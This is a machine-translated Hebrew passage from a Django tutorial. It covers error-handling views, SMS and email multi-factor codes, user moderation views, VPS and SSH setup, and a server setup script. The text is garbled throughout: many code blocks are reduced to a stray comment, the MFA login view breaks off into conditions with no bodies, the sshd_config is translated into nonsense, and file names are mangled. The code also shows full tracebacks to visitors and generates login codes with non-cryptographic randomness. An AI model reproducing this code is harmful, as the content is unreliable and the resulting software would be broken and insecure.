פרויקט זה זקוק לשרת להפעלה כך שהוא באמת יכול לשלוח דואר. אך ראשית, אנו זקוקים לדרך לראות שגיאות. תבחין שאם תריץ את השרת במצב באגים, עם הגדרות. Debug שווה ל- True, השרת מציג שגיאות באופן אוטומטי. כדי להציג שגיאות מבלי להשתמש במצב ניפוי, שאינו בטוח בשרת ייצור, עלינו להוסיף לו תצוגה. השגיאות החשובות ביותר שעלינו להיות מסוגלות להתמודד הן:

שגיאה 500 - בעיה בקוד שלנו
שגיאה 404 - דף שלא נמצא (URL שבור)
שגיאה 403 - שגיאה שנדחתה הרשאה

בואו להוסיף אפליקציה חדשה שתטפל בשגיאות אלה, המכונה שגיאות.<pre class="language-bash"><code>
python manage.py startapp errors
</code></pre>הוסף את זה ל- Settings.py כמו שעשינו קודם, בהגדרת installed_apps, והתחל בהוספת הפניות לתצוגות מסוימות ב- App/urls.py, כאשר האפליקציה היא שם פרויקט Django שלך.<pre class="language-python"><code>
handler404 = 'errors.views.handler404'
handler500 = 'errors.views.handler500'
handler403 = 'errors.views.handler403'
</code></pre>זה כל מה שאנחנו צריכים מלבד תצוגות שגיאות, תבניות וקצת תוכנות תווך. בואו נגדיר את אלה כך:<pre class="language-python"><code># צור את התצוגות שלך כאן.</code></pre>בשלב הבא, בואו נגדיר את תוכנת התווך כדי לטפל בשגיאות אלה. אנו נעשה זאת על ידי הוספת תחילה ל- Middleware_Classes ב- Setvers.py, עם שם ה- Middleware שלנו.<pre class="language-python"><code>    # ... תוכנות ביניים קודמות</code></pre>בשלב הבא, בואו נוסיף את תוכנת התווך.<pre class="language-python"><code>
from threading import local
import traceback
from django.utils.deprecation import MiddlewareMixin

_error = local()

class ExceptionVerboseMiddleware(MiddlewareMixin):
    def process_exception(self, request, exception):
        _error.value = traceback.format_exc()

def get_current_exception():
    try:
        return _error.value
    except AttributeError:
        return None

def set_current_exception(exception):
    try:
        _error.value = exception
    except AttributeError:
        print('Attribute error setting exception.')
</code></pre>אנו מוסיפים פונקציה כדי לקבל את החריג הנוכחי על ידי שימוש במקומי הברגה, המסייע לנו להתחקות אחר שגיאות בקוד שלנו. מבחינת תבניות, אנו זקוקים רק לאחד כזה, מכיוון שאנו מגדירים באופן דינמי את הכותרת בתצוגה. התבנית רק צריכה להפוך את הכותרת ו"עקבות ", השגיאה שלנו עוקבת מההקשר.<pre class="language-bash"><code>
nano errors/templates/errors/error.html
</code></pre>
<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% block content %}
<h1>{{ pagetitle }}</h1>
<p>{{ trace }}</p>
{% endblock %}
 --></code></pre>זו התבנית הפשוטה ביותר שלנו עד כה, אבל זה כמה קל לראות את השגיאות בפרויקט שלנו. בשלב הבא, בואו נשבית באגים בהגדרות.<pre class="language-bash"><code>
nano app/settings.py
</code></pre>מצא את השורה הזו שבה היא מוגדרת כ- True, ושנה אותו לשגוי<pre class="language-python"><code>
DEBUG = False
</code></pre>קדימה לגבות את האפליקציה עכשיו. אנו מוכנים לפרוס לשרת לינוקס מרוחק, וממשיכים להוסיף תכונות משם.<pre class="language-bash"><code>
sudo backup
</code></pre>לפני שנפרסם קוד זה לשרת, עלינו לשקול כי יתכנו כמה בעיות בקוד. בהתאם למקרה, לאתרים המקבלים מידע שפורסם להם יתקיימו בעיות עם פרסום דואר זבל וקושי להסיר את הספאם. זה לא אמור לקרות מייד, אבל אם זה קורה, נבחן בהמשך כיצד למתן אוטומטית דואר זבל באתר ולהפוך אותו לקשה יותר לרובוטים לגשת לאתר, יחד עם הפעלת חשבונות משתמש, ולאמת את זהות המשתמש עם סריקה של תעודת הזהות שלהם או סריקה ביומטרית, כמו טביעת אצבע או זיהוי פנים.

כשמסתכלים על הדוגמה של אימות רב -גורם שבדקנו, בייצור, הדברים יכולים להיות שונים. שימו לב כיצד אנו מגבילים כניסות, ותוקפם אסימונים. אם הרובוטים ניגשים לאתר, אימות שני גורמים יכול להיות קשה יותר מכיוון שהם עשויים להזין קודים בו זמנית המשתמש. כדי להילחם בזה, בואו נשתמש במודל בדגמי המשתמש, ונצהיר כיצד אנו מתקשרים עם האתר כאשר אנואימות באמצעות אימות רב גורם עם מספר טלפון. נוסיף גם אפשרות לאימות עם דוא"ל. התחל על ידי עריכת דגמי המשתמש עם<pre class="language-bash"><code>
nano users/models.py
</code></pre>כך צריך להיראות הדגם שאנו מוסיפים. איננו זקוקים לשיטות, רק משתנים לאחסון מזהה, המשתמש, חותמת הזמן, תפוגה, אורך וניסיונות נגד כל אימות רב -גורם (קוד כמו 123456 שנשלח לטלפון או לדוא"ל).<pre class="language-python"><code># אסימון בסיסי המשמש להתחברות לאתר</code></pre>בואו נוסיף גם זכות למשתמש שלנו, ונגדיר אותה ידנית לעת עתה, לפני שנעבור בסופו של דבר לגיוס משתמשים מיוחסים באופן אוטומטי. בדגמי המשתמש, הוסף שורה זו בפרופיל:<pre class="language-python"><code>
    vendor = models.BooleanField(default=False)
</code></pre>כמו בכל שינויים במסד הנתונים, עלינו לבצע הגירה ולהעביר את מסד הנתונים בכל עת שאנו עורכים קובץ models.py ב- django. זכרו, כדי לעשות זאת אנו משתמשים במקור תחילה (אם הוא לא נעשה שימוש כבר מאז שהטרמינל היה פתוח) ואז Python Manage.py כדי להפוך את ההגירה ולהגיד.<pre class="language-bash"><code>cd project-directory-you-named # (במידת הצורך)</code></pre>לעת עתה, אתה יכול לגייס כל חשבונות שיצרת כספקים באמצעות הקליפה.<pre class="language-bash"><code>
python manage.py shell
from users.models import Profile
p = Profile.objects.get(user__username='Charlotte')
p.vendor = True
p.save()
exit()
</code></pre>כעת, בואו נפתח את תצוגת האימות הרב -גורם שלנו כדי להשתמש באסימון זה. ראשית, עלינו לשנות את כלי השירות העוזר MFA שלנו. באמצעות ננו,<pre class="language-bash"><code>
nano users/mfa.py
</code></pre>
<pre class="language-python"><code>
from django.utils import timezone
import random
import datetime
from django.conf import settings
from feed.middleware import get_current_request
from django.contrib import messages
from .email import send_html_email
import traceback
from .models import MFAToken

account_sid = settings.TWILIO_ACCOUNT_SID
auth_token = settings.TWILIO_AUTH_TOKEN
source_phone = settings.PHONE_NUMBER

def send_text(target_phone, text):
    from twilio.rest import Client
    try:
        client = Client(account_sid, auth_token)
        if len(target_phone) &gt;= 11:
            message = client.messages.create(
                to=target_phone,
                from_=source_phone,
                body=text + ' Text STOP to cancel.')
    except:
        messages.warning(get_current_request(), 'There was an error sending the message.')
        print(traceback.format_exc())

def get_num_length(num, length):
    n = ''
    for x in range(length):
        n = n + str(num)
    return int(n)

def send_verification_text(user, token):
    length = user.profile.verification_code_length
    code = random.randint(get_num_length(1, length), get_num_length(9, length));
    token.token = code
    token.expires = timezone.now() + datetime.timedelta(minutes=settings.AUTH_VALID_MINUTES)
    token.save()
    send_user_text(user, "Your verification code for {} is {}".format(settings.SITE_NAME, str(code)))

def send_verification_email(user, token):
    length = user.profile.verification_code_length
    code = random.randint(get_num_length(1, length), get_num_length(9, length));
    token.token = code
    token.expires = timezone.now() + datetime.timedelta(minutes=settings.AUTH_VALID_MINUTES)
    token.save()
    send_html_email(user, "Your verification code for {} is {}".format(settings.SITE_NAME, str(code)), "&lt;p&gt;Dear {},&lt;/p&gt;&lt;p&gt;Your verification code for {} is {}. Thank you for using this code to secure your account.&lt;/p&gt;&lt;h2&gt;{}&lt;/h2&gt;&lt;p&gt;Sincerely, {}&lt;/p&gt;".format(user.profile.name, settings.SITE_NAME, str(code), str(code), settings.SITE_NAME))

def send_user_text(user, text):
    send_text(user.profile.phone_number, text)

def check_verification_code(user, token, code):
    token.attempts = token.attempts + 1
    profile = user.profile
    result = (token != None and code != '' and token.token == code and (token.expires &gt; timezone.now()) and token.attempts &lt;= settings.MFA_TOKEN_ATTEMPTS)
    if token.attempts &lt; 3 and result:
        profile.verification_code_length = 6
    elif token.attempts &gt; 1 and not result:
        profile.verification_code_length = profile.verification_code_length + 2
        if profile.verification_code_length &gt; settings.MFA_TOKEN_LENGTH: profile.verification_code_length = settings.MFA_TOKEN_LENGTH
    token.save()
    profile.save()
    return result
</code></pre>
<pre class="language-python"><code># לאמת את המשתמש באמצעות הדוא"ל או מספר הטלפון שלו
    token = MFAToken.objects.filter(uid=username, expires__gt=timezone.now() + datetime.timedelta(seconds=30)).order_by('-timestamp').last() # סנן את האסימון לפי הערך שהועבר בכתובת האתר (UUID)
    if not token: token = MFAToken.objects.create(user=User.objects.filter(profile__uuid=username).first(), uid=username, expires=timezone.now() + datetime.timedelta(seconds=115)) # אם הפגישה הזו לא נוצרה, צור אותה
    user = User.objects.filter(id=token.user.id).first() # השג את המשתמש מהאסימון
    if not user and request.user.is_authenticated: return redirect(reverse('feed:home')) # אם הם כבר מאומתים, רשמו אותם
    if not user: raise PermissionDenied() # דחה אם לא נמצא משתמש
    if not user.profile.enable_two_factor_authentication and user.is_active and user.profile.check_auth_token(usertoken, token): # בדוק את אסימון המחבר
        auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend') # התחבר למשתמש אם הוא כבר לא מחובר
        user.profile.mfa_expires = timezone.now() + datetime.timedelta(minutes=settings.LOGIN_VALID_MINUTES) # קבעו תפוגה על אימותם הרב -גורם
        return HttpResponseRedirect(next if next != '' else reverse('landing:landing')) # הפנה את המשתמש לדף הבא
    if not user.profile.mfa_enabled: # בדוק אם MFA מופעל
        if not check_verification_time(user, token): # בדוק את השעה
            user.profile.mfa_enabled = False # נקה את מספר הטלפון
            user.profile.enable_two_factor_authentication = True # אפשר MFA
            user.profile.phone_number = '+1' # השבת את מספר הטלפון
            user.profile.save() # שמור את הפרופיל
            auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend') # רשום את המשתמש אם ה- MFA שלו אינו מופעל
    if request.method == 'POST' and not fraud_detect(request, True): # אם הבקשה היא בקשת פוסט
        form = TfaForm(request.POST) # להפעיל את הטופס
        code = str(form.data.get('code', None)) # קבל את הקוד
        if code and code != '' and code != None: # וודא שהוא לא ריק
            token_validated = user.profile.check_auth_token(usertoken) # בדוק את אסימון המחבר
            is_verified = check_verification_code(user, token, code) # בדוק את הקוד
            if token_validated: # אם הכל
                if is_verified: # הוא בסדר
                    user.profile.mfa_enabled = True # אפשר MFA (אם כבר לא מופעל)
                    auth_login(request, user, backend='django.contrib.auth.backends.ModelBackend') # התחבר למשתמש
                    for key, value in request.GET.items(): # בנה QueryString לפרמטר הבא (אם בכלל)
                        return HttpResponseRedirect(next) # להפניה מחדש
            elif not token_validated: # אם האסימון לא היה חוקי
            if p.mfa_attempts &gt; 3: # אם היו יותר מדי ניסיונות
            if form.data.get('send_email', False): # שלח את הדוא"ל (או הטקסט)
    # העביר את הטופס (לקבלת בקשות GET)</code></pre>כאשר אנו מוסיפים קוד זה, הקפד לייבא את הפונקציה כדי לשלוח דוא"ל. בראש הקובץ, תצוגות המשתמש (עם יבוא אחר), הוסף<pre class="language-python"><code>
from .mfa import send_verification_email as send_mfa_verification_email
</code></pre>כעת, עלינו לכתוב את הפונקציה הזו לפני שאחד מכל זה יעבוד. זה אמור להרחיב את פונקציית הדוא"ל לשלוח שלנו, ופשוט לשלוח דוא"ל למשתמש עם קוד האימות.<pre class="language-bash"><code>
nano users/mfa.py
</code></pre>
<pre class="language-python"><code>
def send_verification_email(user, token):
    length = user.profile.verification_code_length
    code = random.randint(get_num_length(1, length), get_num_length(9, length));
    token.token = code
    token.expires = timezone.now() + datetime.timedelta(minutes=settings.AUTH_VALID_MINUTES)
    token.save()
    send_html_email(user, "Your verification code for {} is {}".format(settings.SITE_NAME, str(code)), "&lt;p&gt;Dear {},&lt;/p&gt;&lt;p&gt;Your verification code for {} is {}. Thank you for using this code to secure your account.&lt;/p&gt;&lt;h2&gt;{}&lt;/h2&gt;&lt;p&gt;Sincerely, {}&lt;/p&gt;".format(user.profile.name, settings.SITE_NAME, str(code), str(code), settings.SITE_NAME))
</code></pre>אז כל זה עובד מצוין, עכשיו יש לנו מערכת אימות רב -גורמים התלויה במספר טלפון או דוא"ל כדי להתחבר. אבל אנחנו גם צריכים דרך להסיר, או לפחות להסתיר משתמשים שאינם משתפים פעולה עם התנאים שלנו. אלה יכולים להיות שולחי דואר זבל, רובוטים או כל מי שלא אומר טוב לעבודה שלנו. עיין בתצוגה שיש לי למעקב אחר משתמשים באתר שלי:<pre class="language-python"><code># יבוא
from .tests import is_superuser_or_vendor # נצטרך ליצור מבחן זה
    # קבל רשימת משתמשים
    return render(request, 'users/users.html', { # להחזיר משתמשים בתבנית</code></pre>שים לב שקוד זה משתמש במבחן, עלינו להכריז על בדיקה זו בקובץ gests.py ולייבא אותו. עריכת משתמשים/test.py, בואו ניצור את הבדיקה.<pre class="language-python"><code>
def is_superuser_or_vendor(user):
    return user.profile.vendor or user.is_superuser
</code></pre>זה בשילוב עם תבנית המשתמשים/המשתמשים. HTML, שנראית משהו כזה:<pre class="language-markup"><code><!-- 
{% extends 'base.html' %}
{% load app_filters %}
{% block content %}
<h1>All Registered Visitors</h1>
<p>{{ new_today|nts|capitalize }} new today, {{ new_this_month|nts }} new this month, {{ subscribers|nts }} subscribers, {{ users.count|nts }} total.</p>
<hr style="color: red;">
{% for user in users %}
{% include 'users/_user.html' %}
<hr style="color: blue;">
{% endfor %}
{% endblock %}
 --></code></pre>שים לב שהתבנית כוללת תבנית אחרת, משתמשים/_user.html. בעת שימוש בתבנית שיש לה תת -דוגמה ולא משתמשת בהרחבות, זה רעיון טוב להוסיף תחתון (_) לפני שם הקובץ להרחבה, על מנת להבחין בתבניות.

שימו לב שמדובר בהרבה ג'ינג'ה, יתכן שלא מוגדרים את כל המשתנים הללו. אבל כך נראה הקוד שלי.<pre class="language-markup"><code>      &lt;small&gt;# {{user.id}} &lt;/small&gt;</code></pre>אנו זקוקים גם לתפגנות משנה נוספת, toggle_active.html. תבנית זו צריכה להיות טופס המאפשר לנו להחליף אם משתמש פעיל.<pre class="language-markup"><code><!-- 
<form style="display: inline-block;" action="{% url 'users:toggle-user-active' user.id %}" method="POST" id="publishForm">
<button class="btn btn-sm btn-outline-danger" type="submit">{% if user.is_active %}<i class="bi bi-eye-fill"></i>{% else %}<i class="bi bi-eye-slash-fill"></i>{% endif %}</button>
</form>
 --></code></pre>נצטרך להוסיף תצוגה כדי להחליף את פעילות המשתמש, ודפוסי כתובות אתרים מתאימות. בזמן שאנחנו בעניין, בואו נוסיף תצוגה למחיקת משתמש למקרה שנצטרך זאת.<pre class="language-python"><code># יבוא
    success_url = '/' # ההפניה מחדש של כתובת האתר ההצלחה
    def test_func(self): # בדוק אם המשתמש הוא סופר -סופר ויש לו אישור למחוק</code></pre>אמנם זה מעשי במידת הצורך, אך מחיקת משתמש לא צריכה להיות נחוצה רוב הזמן, אנו יכולים פשוט להחליף את הנראות של משתמשים המבקרים באתר אם אנו צריכים לבטל אותם.

דפוסי כתובת האתר שהוספנו נראים כך. עם ננו, ערוך משתמשים/urls.py והוסף שורות אלה:<pre class="language-bash"><code>
nano users/urls.py
</code></pre>הקווים צריכים לעבור ברשימת הנתיבים בתצוגות המשתמש, לפני הסיום "]" אך לאחר ההתחלה "[".<pre class="language-python"><code># ...
# ...</code></pre>כעת, הקפד לגבות את האתר כך שתוכל להוריד אותו בשרת האינטרנט שנמשיך לעבוד עליו. משורת הפקודה,<pre class="language-bash"><code>
sudo backup
</code></pre>עכשיו האתר שלנו מגובה.

אז עכשיו יש לנו כמה תכונות שימושיות יותר. אבל מה עם התמונה הגדולה כאן? קוד זה עדיין לא נגיש מהאינטרנט, אין לנו עדיין שרת דואר, ואנחנו צריכים להרחיב את האפליקציה שלנו כך שתכלול תהליך אימות מקיף כמו גם פריסות חלקות שיעזרו לנו לחקור את האתר, יחד עם פרוטוקולים מאובטחים לאמותה של משתמשים מיוחסים ו

נגיע לכל זה. הדבר החשוב ביותר לעת עתה פשוט יקבל את הקוד הזה באופן מקוון, מה שאנחנו יכולים לעשות עם רק כמה שורות של באש בשרת אובונטו. תצטרך לשכור שרת לשם כך, אלא אם כן יש לך שרת בבית ומנוי לאינטרנט עסקי המאפשר לך לפתוח יציאות. אני באופן אישי מפעיל את האתר שלי ב- HP Z440 המותקן בדירה שלי, אך בדרך כלל זה הרבה יותר זול לצרכים בסיסיים לשכור שרת פרטי וירטואלי (VPS).

קחו בחשבון שהקוד שאנו מפעילים עכשיו הוא דק יחסית, יהיה צורך לשמור עליו ולשפר לפני שאנחנומוכן להשתמש במה שיש לנו לבנות מוצר. הקפד להיזהר במה שאתה עושה עם האינטרנט, וודא שאם אתה מפרס את האתר הזה בפומבי לרשת בשרת לינוקס, יש לך תוכנית לחסום אינטראקציות לא רצויות עם האתר שלך. סביר להניח שזו לא תהיה בעיה בהתחלה, אך נבחן מגוון פתרונות כדי להילחם בזה, כולל למידת מכונה, בינה מלאכותית וראיית מחשב. כאשר זה הופך לבעיה, עיין בהמשך בטקסט זה לפיתרון.

מבחינת השכרת VPS, ישנם הרבה מקומות שתוכלו להגיע אליהם. ל- Google Cloud יש שרתי VPS, Ionos, Kamatera, Amazon AWS וספקים נוספים מציעים פתרונות שרת ענן שיתאימו לצרכים שלנו.


תצטרך ללחוץ על הטפסים שלהם ולבחור תוכנית כדי להתחיל. אתה יכול ללכת עם תוכנית בסיסית עם כל ספק, אך וודא שהספק מאפשר לך לפתוח יציאות שרת דואר יציאה כדי לשלוח דוא"ל (זה אמור להיות יציאה 587 ויציאה 25), חלק מהספקים חוסמים יציאות אלה. עד כה היה לי אתEST ניסיון עם יונוס וקמטרה, שניהם יאפשרו לי לשלוח דוא"ל ללא הגבלה והתמחור שלהם די זול.

תתחבר לשרת החדש שלך דרך פרוטוקול בשם SSH או Secure Shell, המאפשר לך להתממשק מרחוק עם השרת בדיוק כמו המחשב האישי שלך, מהמחשב האישי שלך. כשאתה מגדיר את השרת, ספק האירוח ככל הנראה יבקש ממך להוסיף מפתח SSH, או שהוא ייתן לך שם משתמש וסיסמא. מקש ה- SSH הוא כיצד תיכנס לשרת משורת הפקודה כדי לערוך את הקוד. השתמש באפשרויות SSH-Keygen שלהלן כדי ליצור SSH<pre class="language-bash"><code>
ssh-keygen
</code></pre>שמור את הקובץ והחליף אותו אם אתה צריך, טוב לסובב את מפתחות ה- SSH שלך אם עדיין לא עשית זאת. כעת, תוכל להשתמש בפקודה הבאה כדי לראות את מקש ה- SSH שלך. תרצה להעתיק אותו לשרת המרוחק שלך כדי שתוכל להשתמש בו כדי לאמת.<pre class="language-bash"><code>
cat ~/.ssh/id_rsa.pub
</code></pre>אם לא היית מסוגל לראות מפתח SSH בעת הקלדת הפקודה (מחרוזת ארוכה של ספרות ואותיות המתחילות ב"- SSH-RSA AAA "), נסה לייצר מפתח RSA (הם בטוחים יותר, אז אני ממליץ להשתמש בהם .) הקוד הבא יפיק מפתח RSA SSH 4096 סיביות.<pre class="language-bash"><code>
ssh-keygen -t rsa -b 4096
</code></pre>צור VPS המריץ את אובונטו, עם זאת אתה מתכנן לעשות זאת. לאחר שיצרת VPS על ידי לחיצה על הטפסים באתר הספקים (Kamatera.com, ionos.com או דומה), תרצה להתחבר. כדי לעשות זאת, השתמש בפקודה SSH עם כתובת ה- IP שלך (הכתובת זה נראה כמו xx.xx.xx.xx). תצטרך גם להיות רגיש לשם המשתמש המוגדר כברירת מחדל בשרת שיצרנו, למשל, אובונטו.<pre class="language-bash"><code>
ssh ubuntu@XX.XX.XX.XX
</code></pre>יתכן שתתבקש סיסמא, אם תתבקש סיסמא, הזן אותה פנימה. לא נשתמש בשם המשתמש המוגדר כברירת מחדל, אז בואו נתחיל ביצירת משתמש חדש והוספת מפתח SSH לחשבון שלהם.

נתחיל על ידי הוספת קובץ SSHD_CONFIG חדש, שאומר לשרת כיצד להשתמש ב- SSH.<pre class="language-bash"><code>
nano sshd_config
</code></pre>
<pre class="language-bash"><code># זהו קובץ התצורה הכולל SSHD Server System.  לִרְאוֹת
# SSHD_CONFIG (5) למידע נוסף.
# SSHD זה נערך עם נתיב =/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/משחקים
# האסטרטגיה המשמשת לאפשרויות ברירת המחדל SSHD_CONFIG שנשלחה עם
# OpenSsh הוא לציין אפשרויות עם ערך ברירת המחדל שלהן היכן
# אפשרי, אך השאר אותם הגיבו.  אפשרויות שלא הוסברו עוקפות את
# ערך ברירת מחדל.
# יציאה 22
# כתובת משפחה כלשהי
# האזנה ל- Ddress 0.0.0.0
# האזנה ל- Ddress ::
# HostKey/ETC/SSH/SSH_HOST_RSA_KEY
# HostKey/ETC/SSH/SSH_HOST_ECDSA_KEY
# HostKey/ETC/SSH/SSH_HOST_ED25519_KEY
# צ'יפרים ומכרות
# Rekeylimit ברירת מחדל אף אחד
# כניסה
# Syslogfacility Auth
# מידע על Loglevel
# אימות:
# LogingRacetime 2M
# Permitrootlogin prohibit-password
# StrictModes כן
# Maxauthtries 6
# מקססיות 10
# צפו להתעלם.
# אישור Principalsfile אף אחד
# SupporiedKeyScommand אף אחד
# אישור אישור לאף אחד
# כדי שזה יעבוד תזדקק גם למפתחות מארח ב-/etc/ssh/ssh_dyddy_hosts
# מס 'HostBasedAuthentication No
# שנה לכן אם אינך סומך על ~/.ssh/ידוע_הוסט
# HostBasedAuthentication
# לא מתעלם ידוע לא
# אל תקרא את הקבצים ~/.rhosts של המשתמש ו- ~/.
# בורים כן
# כדי להשבית סיסמאות טקסט ברורות במנהרה, שנה ל- NO כאן!
# PermiteMeptyPasswords לא
# שנה ל- YES כדי לאפשר סיסמאות לתגובה של אתגר (היזהר מבעיות עם
# כמה מודולים וחוטים של PAM)
# אפשרויות קרברוס
# Kerberosauthentication no
# Kerberosorlocalpasswd כן
# KerberosticketCleanup כן
# Kerberosgetafstoken no
# אפשרויות GSSAPI
# Gssapiauthentication לא
# Gssapicleanupredentials כן
# Gssapistrictacceptorcheck כן
# Gssapikeyexchange לא
# הגדר את זה ל- 'כן' כדי לאפשר אימות PAM, עיבוד חשבונות,
# ועיבוד מושבים. אם זה מופעל, אימות PAM יהיה
# להיות מותר דרך kbdinteractiveauthentication ו-
# סיסמא -אימות.  תלוי בתצורת ה- PAM שלך,
# אימות PAM באמצעות KBDinterActiVeauthentication עשוי לעקוף
# ההגדרה של "permitrooutlogin ללא מסלול".
# אם אתה רק רוצה שחשבון PAM ובדיקות הפעלה יפעלו בלי
# אימות PAM, ואז הפעל זאת אך הגדר את הסיסמה
# ו- kbdinteractiveauthentication ל'לא '.
# AllingAgentForwarding כן
# Allowtcpforwarding כן
# Gatewayports no
# X11displayOffset 10
# X11uselocalhost כן
# פרמיטי כן
# Printlastlog כן
# Tcpeptealive כן
# Permituserenvernement no
# דחיסה מתעכבת
# 0
# ClientAliveCountMax 3
# משומשים לא
# Pidfile /run/sshd.pid
# MaxStartups 10: 30: 100
# פרמיטונל מספר
# ChrootDirectory אף אחד
# גרסה Addendum אין
# אין נתיב באנר ברירת מחדל
# לאפשר ללקוח לעבור משתני סביבת אזור
# עקוף את ברירת המחדל של NO תת -מערכות
# דוגמה להגדרות עוקבות על בסיס משתמש
# התאם את המשתמש ANONCVS
# X11forwarding לא
# Allowtcpforwarding no
# פרמיטי לא
# שרת CVS של ForceCommand</code></pre>זכור, Ctrl+x ו- Y כדי לשמור את הקובץ. בשלב הבא, בואו נכתוב סקריפט בסיסי בשם אתחול (הכל בספריית הבית המוגדרת כברירת מחדל של המשתמש שלנו).<pre class="language-bash"><code>
nano initialize
</code></pre>הוסף שורות אלה לקובץ, החלף<key here="">עם מקש ה- SSH שלך מצאת באמצעות CAT. (.ssh/id_rsa.pub)<pre class="language-bash"><code># !/bin/bash</code></pre>כדי לעבור אותך דרך קובץ זה, בואו נתחיל בשורה אחר שורה. השורה הראשונה אומרת למהדר שמדובר בתסריט Bash. ואז אנו מתקינים תלות, מעתיקים SSHD_CONFIG לספרייה הנכונה, מפעילים מחדש את SSH, מייצרים מפתחות SSH לשורש, הוספת צוות המשתמש '(אתה יכול לבחור שם שאתה רוצה לשם כך, השתמש בפקודה Adduser עם השם והסיסמה המושבתת עבור עַכשָׁיו). אנו מוסיפים גם צוות לקבוצת SUDO, מייצרים את מפתח ה- SSH שלהם, מוסיפים גם את המפתח שלנו למפתחות מורשים ושלהם ומדפיסים את המפתח שלהם. משתמש חדש זה יהיה כיצד אנו נכנסים לאתר.

בטרמינל חדש, קדימה ופתח את השרת שוב.<pre class="language-bash"><code>
ssh team@XX.XX.XX.XX
</code></pre>אתה לא צריך להזדקק לסיסמה הפעם, להיות כמו שיש לך מפתח SSH. השבתנו גם את הכניסה עם סיסמה כדי לשמור על האתר מאובטח יותר.

כעת, שרת זה מתחיל ריק לחלוטין ללא מידע עליו. נתחיל בשיבוט הפרויקט שלנו מ- Git כדי שנוכל להוריד ולהריץ אותו במכונה המרוחקת. בשרת המרוחק המחובר דרך SSH, הדפס תחילה את מקש ה- SSH שלך:<pre class="language-bash"><code>
cat ~/.ssh/id_rsa.pub
</code></pre>בשלב הבא, הדבק את המפתח הזה להגדרות ה- GIT כמו שעשינו קודם כדי להקים את מאגר ה- GIT שלנו. כעת אנו עשויים לשכפל את הפרויקט שלנו ישירות לשרת. Make sure you have backed up the project locally first so it's on the git server to download.<pre class="language-bash"><code>
git clone git://github.com/you/yourproject.git
</code></pre>מוּשׁלָם. עכשיו כל הקבצים כאן. אנחנו יכולים לראות אותם עם LS<pre class="language-bash"><code>
ls
</code></pre>עכשיו, נתחיל להגדיר את השרת. ראשית, העתק את ספריית הפרויקטים שלך לשם פשוט ובלתי נשכח שנשתמש בו לפרויקט.<pre class="language-bash"><code>
cp -r yourproject whatyoucalledit
</code></pre>איפה "WhatyoucallEdit" הוא השם החדש של הפרויקט שלך. בשלב הבא נצטרך לבנות כלי עזר בסיסי להגדרת השרת. אנו נשמור כלי עזר זה ונשתמש בו בעתיד. כדי לבנות כלי עזר זה, בואו ניצור בינארי משתמש כדי להגדיר כיצד אנו עורכים סקריפט. באמצעות Bash, ערוך/usr/bin/ascript<pre class="language-bash"><code>
sudo nano /usr/bin/ascript
</code></pre>הקפד להשתמש ב- SUDO שם כך שיש לך הרשאות לערוך את הקובץ. בקובץ, הוסף שורות אלה:<pre class="language-bash"><code># !/bin/bash
    echo "# !/bin/bash "&gt;&gt;/usr/bin/$ 1</code></pre>זכור כי סקריפט זה לוקח טיעון, שם הסקריפט, כ- $ 1. ראשית הוא בודק אם הקובץ קיים, או יוצר אותו בדרך אחרת, מוסיף את השורה הראשונה כדי להכריז על הסקריפט הוא BASH, משנה את הרשאותיו, עורך אותו ומוסיף את שמו ל /וכו ' /אספטים המאפשרים לנו לאחסן את שמות הסקריפטים שאנו יוצרים. אם הקובץ כבר קיים, פשוט שנה הרשאות וערוך אותו. שמור את הקובץ, ובהמשך נשנה את הרשאותיו. כל עוד אנו משתמשים בתסריט זה, לא נצטרך לעשות זאת שוב.<pre class="language-bash"><code>
sudo chmod a+x /usr/bin/ascript
</code></pre>מוּשׁלָם. עכשיו בואו ניצור סקריפט שנקרא הגדרה. ראשית, לא להציף אותך, אלא תסתכל על איך נראה סקריפט ההתקנה שלי. אנו נעבור איך התסריט הזה צריך להיראות בפרויקט שלך, לא תצטרך כל מה בתסריט שלי מלכתחילה.<pre class="language-bash"><code># !/bin/bash
# sudo chmod a+x סקריפטים/משתמשים
# ./scripts/usersetup
# ssh-keygen
# ספריית פרויקטים
# פקודות יומן
# NANO CONFIG
# Git Config
# עדכן והתקן
# אפשר אנטי -וירוס Clamav
# הגדר שם מארח
# הגדרת Postgres
# הגדרת גיבוי מסד נתונים
# השבת iptables
# התקן bitdefender
# הגדרת Postfix
# ליצור דירים
# הגדרת Virtualenv
# קבל ולבנות תלות
# קבעו כללי חומת אש
# התקן תלות PYPI
pip3 install --upgrade opencv-python # == 4.5.4.60
pip3 install --upgrade opencv-contrib-python # == 4.5.4.60
# PIP התקנה OpenCV-python == 4.5.5.64
# PIP התקן OpenCV-Contrib-python == 4.5.5.64
# התקן את CertBot
# הפעל את CertBot
# טען מחדש שרת דואר
# העתק אישורים
# sudo cp /etc/letsencrypt/live/femmebabe.com/privkey.pem privkey.pem
# sudo cp /etc/letsencrypt/live/femmebabe.com/cert.pem cert.pem
# תיקון Venv
# הגדר הגדרות משתמש
# הגדר הרשאות
# SUDO CHOWN -R TEAM: משתמשים/var/run/
# שורש Sudo Chown: שורש/ריצה/sudo/ts -r
# sudo chmod 664 db.sqlite3
# sudo chown www-data: משתמשים db.sqlite3
# העתק תצורה והגדר הרשאות
# מסד נתונים של הגדרת
# הזרקו את תצורת PAM והסירו את תצורת SSH פגומה
# sudo sed -i '' -e '$ d' /etc/pam.d/sshd
# sudo sed -i '' -e '$ d' /etc /פרופיל
# העתק סקריפטים של סל והגדר הרשאות
# טען מחדש ומאפשר שירותים
# אפשר מודולי אפאצ'י
# sudo a2dismod mpm_event
# sudo a2dismod mpm_worker
# sudo a2enmod mpm_prefork
# השבת אתר ברירת מחדל
# הפעל את האתר שלנו
# טען מחדש את הדמון והפעיל מחדש את אפאצ'י, Postfix ו- Opendkim
# הגדר הרשאות
# החלפת תצורה
# מנוע הכיתוב של init
# הגדרת git
# הצג את IPv6 ו- OpenDkim לתצורת דומיין
